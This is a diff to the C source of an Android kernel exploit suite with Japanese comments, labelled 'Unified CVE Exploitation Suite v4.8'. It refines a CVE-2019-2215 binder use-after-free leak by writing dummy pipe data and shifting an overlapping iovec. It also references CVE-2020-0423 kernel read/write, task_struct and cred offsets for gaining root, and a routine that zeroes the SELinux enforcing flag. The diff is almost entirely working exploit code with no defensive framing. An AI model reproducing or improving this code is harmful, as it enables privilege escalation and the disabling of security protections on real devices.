@@ -28,7 +28,7 @@
 #include <stdint.h>
 #include <sys/fsuid.h>
 #include "binder.h"
-#include "offsets.h"            /* 追加: 正しいオフセット定義 */
+#include "offsets.h"            /* 正しいオフセット定義 */
 
 extern int setfsuid(uid_t);
 extern int setfsgid(gid_t);
@@ -99,8 +99,7 @@ static int g_epoll_fd = -1;
 static int g_krw_pipe[2] = {-1, -1};
 static uint64_t g_task_struct = 0;
 static uint64_t g_cred_ptr = 0;
-static int g_cred_off = TASK_REAL_CRED_OFF;   /* offsets.h の正しい値 */
-static int g_al_off = 0;                     /* 未使用 */
+static int g_cred_off = TASK_REAL_CRED_OFF;   /* offsets.h から */
 static int g_root_achieved = 0;
 static int g_system_privilege = 0;
 
@@ -298,7 +297,7 @@ static int test_cve_2020_0423(void) {
 
 /* ============================================================
    CVE-2019-2215 Leak with readv and overlapping iovec
-   修正: 正しい cred_off (TASK_REAL_CRED_OFF) を固定で使用
+   修正: パイプにダミーデータを書き込み、ブロックを防止
    ============================================================ */
 static int leak_kernel_pointer(int *cred_off_out, int *al_off_out) {
     int pipefd[2], fd, epoll_fd;
@@ -307,6 +306,7 @@ static int leak_kernel_pointer(int *cred_off_out, int *al_off_out) {
     void *aligned;
     ssize_t n;
     uint64_t *data;
+    char dummy[PAGE_SIZE];
 
     fd = open("/dev/binder", O_RDWR);
     if (fd < 0) return -1;
@@ -337,6 +337,16 @@ static int leak_kernel_pointer(int *cred_off_out, int *al_off_out) {
         return -1;
     }
 
+    /* パイプにダミーデータを書き込んで readv がブロックしないようにする */
+    memset(dummy, 0x41, PAGE_SIZE);
+    if (write(pipefd[1], dummy, PAGE_SIZE) != PAGE_SIZE) {
+        close(fd);
+        close(epoll_fd);
+        close(pipefd[0]);
+        close(pipefd[1]);
+        return -1;
+    }
+
     aligned = mmap_page(0x100000000UL);
     if (!aligned) {
         close(fd);
@@ -346,11 +356,11 @@ static int leak_kernel_pointer(int *cred_off_out, int *al_off_out) {
         return -1;
     }
 
-    /* Overlapping iovec for readv */
+    /* オーバーラップする iovec を設定 */
     memset(iovec_stack, 0, sizeof(iovec_stack));
     iovec_stack[OVERLAP_INDEX].iov_base = aligned;
     iovec_stack[OVERLAP_INDEX].iov_len = PAGE_SIZE;
-    iovec_stack[OVERLAP_INDEX + 1].iov_base = (void *)aligned;
+    iovec_stack[OVERLAP_INDEX + 1].iov_base = (void *)aligned + 0x800; // 少しずらしてオーバーラップ
     iovec_stack[OVERLAP_INDEX + 1].iov_len = PAGE_SIZE;
 
     cpid = fork();
@@ -368,6 +378,14 @@ static int leak_kernel_pointer(int *cred_off_out, int *al_off_out) {
         _exit(0);
     }
 
+    /* epoll イベントを待つ（タイムアウト付き） */
+    struct epoll_event events[1];
+    int ret = epoll_wait(epoll_fd, events, 1, 3000);
+    if (ret <= 0) {
+        printf("  [!] epoll_wait returned %d, continuing anyway\n", ret);
+    }
+
+    /* パイプから読み出す（データは既にあるのでブロックしない） */
     n = readv(pipefd[0], iovec_stack + OVERLAP_INDEX, 2);
     wait(NULL);
 
@@ -383,7 +401,7 @@ static int leak_kernel_pointer(int *cred_off_out, int *al_off_out) {
         uint64_t val = data[i];
         if ((val & 0xFFFFFFFFFF000000LL) == 0xFFFF000000000000LL) {
             g_task_struct = val;
-            g_cred_off = TASK_REAL_CRED_OFF;   /* offsets.h の正しい値 */
+            g_cred_off = TASK_REAL_CRED_OFF;
             *cred_off_out = g_cred_off;
             *al_off_out = 0;
             printf("  [+] Found task_struct=0x%llx, cred_off=0x%x\n",
@@ -458,7 +476,6 @@ static int setup_kernel_rw(void) {
 
 /* ============================================================
    CVE-2020-0423 RW with spray after free (improved timing)
-   修正: 正しい cred_off を固定で使用
    ============================================================ */
 static int exploit_cve_2020_0423_rw(void) {
     printf("[*] Attempting kernel RW via CVE-2020-0423 UAF (spray after free)...\n");
@@ -708,7 +725,6 @@ static int try_selinux_disable_via_kernel(void) {
     uint64_t selinux_addr = SELINUX_ENFORCING;
     printf("  [+] SELinux enforcing address from offsets.h: 0x%llx\n", (unsigned long long)selinux_addr);
 
-    /* 書き込み: 0 に設定して permissive にする */
     uint32_t zero = 0;
     if (write(g_krw_pipe[1], &selinux_addr, 8) != 8) {
         perror("  write selinux addr");
@@ -1080,7 +1096,7 @@ int main(void) {
     int gpu_leak_ok = 0;
     int qseecom_ok = 0;
     uint64_t leaked_addr = 0;
-    int cred_off_dummy = -1, al_off_dummy = -1;  /* ダミー変数 */
+    int cred_off_dummy = -1, al_off_dummy = -1;
 
     printf("==================================================\n");
     printf("  Unified CVE Exploitation Suite v4.8\n");
